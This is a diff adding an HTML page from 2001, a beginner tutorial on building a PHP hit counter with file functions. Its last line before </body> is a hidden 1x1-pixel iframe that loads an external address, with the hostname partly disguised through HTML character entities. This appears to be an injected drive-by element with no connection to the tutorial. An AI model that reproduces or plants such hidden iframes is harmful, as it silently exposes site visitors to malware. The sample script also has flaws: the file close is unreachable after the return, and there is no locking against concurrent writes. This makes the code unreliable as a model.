@@ -1,0 +1,215 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<title>Creating A Simple Hit Counter In PHP </title>
+	
+	<meta http-equiv="Content-Type" content="text/html charset=utf-8" />
+	<meta content="Copyright 2001 SpiderMan" name="Copyright" />
+	<meta content="SpiderMan" name="Author" />
+	<meta content="English" name="Language" />
+	
+	<style type="text/css">
+	<!--
+		body {font: 12px Verdana, Arial, Helvetica, sans-serif}
+	
+		table.example {width: 550px; font-size: 12px; text-align:left}
+		tr.exampletop {background-color: #EBEBEB}
+	
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px, 3px, 3px, 3px; text-align: left; width: 500px; margin-left: auto; margin-right: auto}
+	
+		p {text-align: left;}
+		p.para {text-indent: 12px}
+	
+		div.lastupdate {text-align: right}
+		/* hack so IE will center my stuff since it doesn't recognize margin: auto */
+		div.center {text-align: center}
+	
+		a:link {text-decoration: underline; color: #003F7F}
+		a:visited {text-decoration: underline; color: #003F7F}
+		a:hover {text-decoration: underline; color: #CC0000}
+
+		h2 {font-size: 12px}
+		h1.title {font-weight: normal; text-align: center; font-size: 12px}
+	-->
+	</style>
+</head>
+
+<body>
+	<h1 class="title">
+		<strong>Creating A Simple Hit Counter In PHP (ver. 1.0.0)</strong>
+		<br />
+		by: <a href="mailto:spiderman@witty.com">SpiderMan</A> of <a href="http://blacksun.box.sk">Black Sun Research Facility </a>
+	</h1>
+	<h2>Introduction:</h2>
+	<p class="para">
+		Welcome to part 2 of the Practical Programming in PHP series. Today, I will show you how you can use php's file handling functions to create a web site hit counter. The script should be compatible with PHP 3 and 4. I will be running the script on a server which has a variant of Unix installed (most servers do).
+	</p>
+	<h2>Background:</h2>
+	<p class="para">
+		The script that we will create will&#8212;when called&#8212;open a file, read the value of the file, increment the value by one, and then write that value to the file. We're going to put the actual code inside a function so that way you can call the script on your page with only one line of code.
+	</p>
+	<h2>Down To Work:</h2>
+	<p class="para">
+		In order to open a file in php, we need to call the function fopen(). This will open the file, if it exists, and return a file pointer. Don't worry too much on what a file pointer is, think of it as an alias for the file. Instead of using the file name, you pass a file pointer to functions. Here is the beginning of our code:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php
+  function count_hit()
+  {
+    $file_pointer= fopen("hits.txt", "r+");
+</pre>
+	</div>
+	<p>
+		First, we declared a function by using the keyword function followed by the name of our function. Next, we used fopen() passing the name of a file in the same directory as the script where the hits will be stored as the first parameter; we then passed r+ as the second parameter, this tells the server that we want to open the hits.txt file for reading and writing. You can also pass any one of the following:
+	</p>
+	<table class="example" align="center" border="1" cellspacing="0" cellpadding="2" summary="Table of flags">
+		<tr class="example">
+			<td>r</td>
+			<td>Open the file for reading, place the file pointer at the beginning of the file.</td>
+		</tr>
+		<tr>
+			<td>w</td>
+			<td>Open the file for writing, place the file pointer at the beginning of the file, create the file if it doesn't exist, and set the file to zero length.</td>
+		</tr>
+		<tr>
+			<td>w+</td>
+			<td>Open the file for reading and writing, place the file pointer at the beginning of the file, create the file if it doesn't exist, and set the file to zero length.</td>
+		</tr>
+		<tr>
+			<td>a</td>
+			<td>Open for writing only; place the file pointer at the end of the file. If the file does not exist, attempt to create it.</td>
+		</tr>
+		<tr>
+			<td>a+</td>
+			<td>Open for reading and writing; place the file pointer at the end of the file. If the file does not exist, attempt to create it.</td>
+		</tr>
+		<tr>
+			<td>b</td>
+			<td>Open the file in binary mode, if not needed, this will be ignored.</td>
+		</tr>
+	</table>
+	<p>
+		fopen() can take one more parameter: 1. If you pass the third parameter as 1, the file you passed the name of in the first parameter will be searched for in the include path. The include path is specified when php if first installed on the server, most of the time you won't have control over it. We store the result of fopen() in a variable named $file_pointer. If the file does not exist, fopen() will return false; we need to test for that.
+	</p>
+	<div class="center">
+	<pre class="example">
+if ($file_pointer == false)
+{
+  return "Error: could not open the file! It may not exist!";
+  exit; 
+}
+</pre>
+	</div>
+	<p>
+		I used a return instead of an echo because we are in a function, and it's not always a good idea to use echo.
+	</p>
+	<p class="para">
+		Now that the file is open, we need to read from it, to do that we use the fread() function.
+	</p>
+	<div class="center">
+		<pre class="example">
+$hits= fread($file_pointer, filesize("hits.txt"));
+</pre>
+	</div>
+	<p>
+		For fread() we pass the file pointer along with the size of the file. To get the size of the file we use the filesize() function. Now the contents of the file are stored in a variable with the name $hits. This next part is optional, but you should do it because you never really know what kind of extra junk might also get read into the variable. We will use the trim() function to strip any whitespace from the beginning and ending of the string.
+	</p>
+	<div class="center">
+		<pre class="example">
+$hits= trim($hits);
+</pre>
+	</div>
+	<p>
+		See that's not too bad, and well worth the effort. Now that we have read the contents of the file into a variable and cleaned up the variable, we will increment it by 1, and write it back into the file. Before we write to the file, we need to go back to the begining of the file so we can write over the current count. We do this by using fseek(), thanks to Mateusz Pabis for pointing that out.
+	</p>
+	<div class="center">
+		<pre class="example">
+$hits++;
+fseek($file_pointer, 0);
+$result= fwrite($file_pointer, $hits);
+	  
+if ($result == false)
+{
+  return "Error: could not write to the file!";
+  exit; 
+}
+else {
+  return $hits;
+}
+</pre>
+	</div>
+	<p>
+		We use the increment operator (++) to add one to the hit count, then we use fwrite to write to the file. We then pass the file pointer and the hit count to fwrite(), then there is some error checking, you don't have to include it, but it is always a good idea. Lastly, we return the value of $hits, which holds the hit count, so that you can display the hits on a webpage by doing:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt?php echo count_hit( ); ?&gt;
+</pre>
+	</div>
+	<p class="para">
+		Only one more thing left to do: close the file. To do that we use fclose() and pass it the file pointer, oh and can't forget the error checking =)
+	</p>
+	<div class="center">
+		<pre class="example">
+$close= fclose($file_pointer);
+
+if ($close == false)
+{
+  return "Error: could not close the file!";
+  exit; 
+} 
+</pre>
+	</div>
+	<p>
+		And that's all, we're done! Here is the complete script:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?php
+ function count_hit()
+ { 
+   $file_pointer= fopen("hits.txt", "r+");
+   
+   if ($file_pointer == false)
+   {
+     return "Error: could not open the file! It may not exist!";
+     exit; 
+   }
+   
+   $hits= fread($file_pointer, filesize("hits.txt"));
+   $hits= trim($hits);
+   $hits++;
+   fseek($file_pointer, 0);
+   $result= fwrite($file_pointer, $hits);
+   
+   if ($result == false)
+   {
+     return "Error: could not write to the file!";
+     exit; 
+   }
+   else {
+     return $hits;
+   }
+   
+   $close= fclose($file_pointer);
+   
+   if ($close == false)
+   {
+     echo "Error: could not close the file!";
+     exit; 
+   }
+ }
+?&gt;
+</pre>
+	</div>
+	<h2>Conclusion:</h2>
+	<p class="para">
+		Well that wraps up part 2 of the Practical Programming series. I hope you learned how to manipulate files in php. If you found any errors or have any comments please e-mail me (<a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>), kindly direct questions to the message board.
+	</p>
+	<div class="lastupdate">Last updated: <strong>5/28/01</strong></div>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
